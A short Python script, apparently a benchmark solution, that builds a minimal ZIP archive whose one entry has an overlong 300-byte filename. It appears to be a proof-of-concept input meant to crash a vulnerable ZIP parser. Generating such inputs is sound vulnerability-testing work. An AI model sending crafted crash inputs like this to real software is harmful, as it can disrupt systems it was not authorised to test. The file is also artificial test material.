import struct
from typing import Optional


def _u16(x: int) -> bytes:
    return struct.pack("<H", x & 0xFFFF)


def _u32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def _build_minimal_zip_with_long_filename(name_len: int) -> bytes:
    if name_len < 0:
        name_len = 0
    if name_len > 0xFFFF:
        name_len = 0xFFFF

    fname = (b"A" * name_len) if name_len else b""
    extra = b""
    file_data = b""

    # Local file header
    # signature, ver_needed, flags, method, mtime, mdate, crc32, csize, usize, fnlen, xlen
    lfh = (
        _u32(0x04034B50) +
        _u16(20) +
        _u16(0) +
        _u16(0) +
        _u16(0) +
        _u16(0) +
        _u32(0) +
        _u32(len(file_data)) +
        _u32(len(file_data)) +
        _u16(len(fname)) +
        _u16(len(extra))
    )
    local_offset = 0
    local_record = lfh + fname + extra + file_data

    # Central directory header
    # signature, ver_made, ver_needed, flags, method, mtime, mdate, crc32, csize, usize,
    # fnlen, xlen, comlen, disk, intattr, extattr, lhoff
    cdh = (
        _u32(0x02014B50) +
        _u16(20) +
        _u16(20) +
        _u16(0) +
        _u16(0) +
        _u16(0) +
        _u16(0) +
        _u32(0) +
        _u32(len(file_data)) +
        _u32(len(file_data)) +
        _u16(len(fname)) +
        _u16(0) +
        _u16(0) +
        _u16(0) +
        _u16(0) +
        _u32(0) +
        _u32(local_offset)
    )
    central_record = cdh + fname

    cd_offset = len(local_record)
    cd_size = len(central_record)

    # End of central directory
    eocd = (
        _u32(0x06054B50) +
        _u16(0) +
        _u16(0) +
        _u16(1) +
        _u16(1) +
        _u32(cd_size) +
        _u32(cd_offset) +
        _u16(0)
    )

    return local_record + central_record + eocd


class Solution:
    def solve(self, src_path: str) -> bytes:
        return _build_minimal_zip_with_long_filename(300)